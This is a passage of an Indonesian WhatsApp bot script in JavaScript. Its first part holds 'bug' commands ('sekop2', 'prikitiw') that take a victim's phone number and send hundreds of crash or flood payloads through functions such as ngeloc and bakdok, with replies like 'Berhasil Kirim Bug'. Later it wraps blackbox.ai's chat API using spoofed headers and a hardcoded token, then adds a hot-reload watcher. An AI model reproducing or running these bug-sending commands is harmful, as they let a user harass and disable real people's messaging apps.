await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
await bakdok (target, force) 
await penghitaman(target, force2)
await ngeloc(target, force)
}
await reply(`Berhasil Kirim Bug ke ${hunter} 🔥.`)
}
break

case 'tes2': case 'sekop2': {
if (!q) return reply(`*Example to use feature : ${prefix} ${command} 62xxx-xxx-xx*`)
let hunter = q.replace(/[^0-9]/g, "")
if (hunter.startsWith('0')) return reply(`Format (0), Format harus di awali kode negara\n*Contoh : sekop 628976788677*`)
let target = hunter + '@s.whatsapp.net'
await reply('Proses bug 😈...')
for (let j = 0; j < 300; j++) {
bakdok (target, force) 
}
await reply(`Berhasil Kirim Bug ke ${hunter} 🔥.`)
}
break
case 'prikitiw': {
if (!isPrem) return m.reply('Fitur ini berbahay, makannya di kunci')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
  for (let j = 10000; j < q; j++) {
    await ngeloc(target, sirbug)
  }
 await reply('✅Succes')
}
break

/*
*
* [ *FEATURE BLACKBOX AI* ]
* Created By Hann
*
* Follow Saluran Kami Untuk Update Fitur Selanjutnya
* Saluran: https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
*
**/

//khusus yg butuh aja, jangan protes😞✌️

case 'blackbox': {
  
  const { randomBytes, randomUUID } = require("crypto");
const api = 'https://www.blackbox.ai/api/chat';
const headers = {
  'User-Agent': 'Postify/1.0.0',
  'Accept': '*/*',
  'Referer': 'https://www.blackbox.ai',
  'Content-Type': 'application/json',
  'Origin': 'https://www.blackbox.ai',
  'DNT': '1',
  'Sec-GPC': '1',
  'Connection': 'keep-alive'
};

const request = (chat) => chat.map(({ files, ...rest }) => rest);
const rhex = (bytes) => randomBytes(bytes).toString('hex');
const uuid = () => randomUUID();

const config = (model) => ({
  trendingAgentMode: model[model] || {},
  userSelectedModel: defaultModel[model] || undefined,
  ...po[model]
});

const model = {
  blackbox: {},
  'llama-3.1-405b': { mode: true, id: 'llama-3.1-405b' },
  'llama-3.1-70b': { mode: true, id: 'llama-3.1-70b' },
  'gemini-1.5-flash': { mode: true, id: 'Gemini' }
};

const defaultModel = {
  'gpt-4o': 'gpt-4o',
  'claude-3.5-sonnet': 'claude-sonnet-3.5',
  'gemini-pro': 'gemini-pro'
};

const po = {
  'gpt-4o': { maxTokens: 4096 },
  'claude-3.5-sonnet': { maxTokens: 8192 },
  'gemini-pro': { maxTokens: 8192 }
};

const clear = (response) => {
  return response.replace(/\$~~~\$(.*?)\$~~~\$/g, '').trim();
};

const BlackBox = {
  async generate(chat, options, { max_retries = 5 } = {}) {
    const random_id = rhex(16);
    const random_user_id = uuid();
    chat = request(chat);

    const data = {
      messages: chat,
      id: random_id,
      userId: random_user_id,
      previewToken: null,
      codeModelMode: true,
      agentMode: {},
      ...config(options.model),
      isMicMode: false,
      isChromeExt: false,
      githubToken: null,
      webSearchMode: true,
      userSystemPrompt: null,
      mobileClient: false,
      maxTokens: 100000,
      playgroundTemperature: parseFloat(options.temperature) || 0.7,
      playgroundTopP: 0.9,
      validated: "69783381-2ce4-4dbd-ac78-35e9063feabc",
    };

    try {
      const response = await fetch(api, { method: 'POST', headers, body: JSON.stringify(data) });
      if (!response.ok) {
        throw new Error(`${await response.text()}`);
      }

      let tc = await response.text();
      let tr = clear(tc);


      if (tr.includes("$~~~$")) {
        data.mode = 'continue';
        if (!data.messages.some(msg => msg.content === tr)) {
          data.messages.push({ content: tr, role: 'assistant' });
        }

        const cor = await fetch(api, { method: 'POST', headers, body: JSON.stringify(data) });
        let ctc = await cor.text();
        tr += clear(ctc);
      }

      return tr; 

    } catch (err) {
      if (max_retries > 0) {
        console.error(err, "Mencoba ulang...");
        return this.generate(chat, options, { max_retries: max_retries - 1 });
      } else {
        throw err;
      }
    }
  }
};

  
  let { key } = await Rifky.sendMessage(m.chat, { text: "..." });
  try {
    // Pastikan minimal ada teks
    if (!text) return m.reply("Masukkan pertanyaan untuk dijawab!\n\n*Contoh:* Siapa presiden Indonesia?");

    // Siapkan chat untuk dikirim ke BlackBox
    const chatMessages = [{ role: 'user', content: text }];
    const options = { model: 'blackbox', temperature: 0.7 }; // Sesuaikan model dan suhu jika perlu

    const responseMessage = await BlackBox.generate(chatMessages, options);

    await Rifky.sendMessage(m.chat, {
      text: responseMessage,
      edit: key,
    });
  } catch (error) {
    await Rifky.sendMessage(m.chat, {
      text: `Error: ${error.message}`,
      edit: key,
    });
  }
}
break
        default: {
          if (isCmd2 && budy.toLowerCase() != undefined) {
            if (m.chat.endsWith("broadcast")) return;
            if (m.isBaileys) return;
            if (!budy.toLowerCase()) return;
            if (argsLog || (isCmd2 && !m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("tidak tersedia", "turquoise"));
            } else if (argsLog || (isCmd2 && m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("tidak tersedia", "turquoise"));
            }
          }
        }
      }
    }
  } catch (err) {
    m.reply(util.format(err));
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});
